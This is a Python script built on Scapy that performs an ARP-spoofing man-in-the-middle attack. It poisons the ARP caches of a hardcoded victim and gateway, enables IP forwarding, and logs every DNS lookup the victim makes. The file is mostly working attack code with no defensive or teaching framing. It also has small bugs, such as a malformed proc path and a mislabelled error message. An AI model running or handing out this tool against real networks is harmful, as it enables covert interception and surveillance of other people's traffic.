from scapy.all import *
import threading 
import os
import sys
from datetime import datetime 

def all():
  def show_dictionary():
    for k,v in output.items():
      print (k, "->", v)


#Getting Mac Addresses of IP Address
  def get_MACaddress(ip):
   pack = Ether (dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip, hwdst="ff:ff:ff:ff:ff:ff")
   resp = srp1(pack, verbose=0, timeout=2)
   if resp:
      return resp.hwsrc
   else: 
      return None 

#Poisoning Victim 
  def v_poison():
    p = Ether(dst=V_MAC) / ARP (psrc=GW_IP, pdst=V_IP, hwdst=V_MAC)
    while True: 
      try:
        srp1(p, verbose=0, timeout=1)
      except KeyboardInterrupt:
        restore(GW_IP, V_IP)
        os.system("echo 0 > proc/sys/net/ipv4/ip_forward")
        sys.exit(1)

#Restoring ARP Poison
  def restore(GW_IP, V_IP):
    victimMAC = get_MACaddress(V_IP)
    routerMAC = get_MACaddress(GW_IP)
    send(ARP(op=2, pdst = GW_IP, psrc = V_IP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count=4)
    send(ARP(op=2, pdst = V_IP, psrc = GW_IP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count=4)

#Gateway Poison
  def gw_poison():
   p = Ether(dst=GW_MAC) / ARP(psrc=V_IP, pdst=GW_IP, hwdst=GW_MAC)
   while True:
      try:
        srp1(p,verbose=0, timeout=1)
      except KeyboardInterrupt:
        restore(GW_IP, V_IP)
        os.system("echo 0 > proc/sys/net/ipv4/ip_forward")
        sys.exit(1)

#DNS Sniffing 
  def sniff_request():
#  pkts = sniff(iface = INTERFACE, filter = "udp port 53",count = 100, prn=dns_sniff_request)
 # wrpcap("temp.pcap", pkts)
    sniff(iface = INTERFACE, filter = "udp port 53",count = 100, prn=dns_sniff_request)

  def dns_sniff_request(pkt):
    try: 
      pkt.getlayer(IP).src
      pkt.getlayer(Ether).src
    except AttributeError:
      return
    if (
      pkt.getlayer(IP).src == V_IP
     and pkt.getlayer(Ether).src == V_MAC
      and pkt.haslayer(DNS) 
      and pkt.getlayer(DNS).qr == 0
    ):
      date = datetime.now().strftime("[%Y-%m-%d-%H:%M:%S]")
#    print(pkt.show())
      print(date + " Service: DNS" + " Victim " + pkt.getlayer(IP).src + " (" + pkt.getlayer(Ether).src + ") is resolving " + pkt.getlayer(DNS).qd.qname + " with " + str(len(pkt)) + " bytes in length.")
      

#Constant inputs -> Can ask from user also 
  ATTACK_TYPE_SNIFF = 0
  DEFAULT_GATEWAY_IP = "192.168.0.1"
  DEFAULT_INTERFACE = "wlan0"
  GW_IP = DEFAULT_GATEWAY_IP
  INTERFACE = DEFAULT_INTERFACE
#V_IP = raw_input("Put in victim IP Address to attack: ")
  V_IP = "192.168.0.168"

  print("Obtaining MAC Addresses")
  while True:
    V_MAC = get_MACaddress(V_IP)
    GW_MAC = get_MACaddress(GW_IP)
    if V_MAC is None:
      print("Cannot find victim MAC Address (" + V_IP + "), retrying...")
    elif GW_MAC is None:
      print("Cannot find victim MAC Address (" + GW_IP + "), retrying...")
    else:
      break

  print("Attack targets have been found")

#Showing ARP Spoofing targets
  print("Victim: " + V_IP + " (" + V_MAC + ")")
  print("Gateway: " + GW_IP + " (" + GW_MAC + ")")
  print("Poisoning victim and gateway...")

  os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
  vthread=[]
  gwthread=[]
  print("Showing sniffed traffic...")


#Main Program Loop 
  while True:
    vpoison = threading.Thread(target=v_poison)
    vpoison.setDaemon(True)
    vthread.append(vpoison)
    vpoison.start()

    gwpoison = threading.Thread(target=gw_poison)
    gwpoison.setDaemon(True)
    gwthread.append(gwpoison)
    gwpoison.start()

    sniff_request()




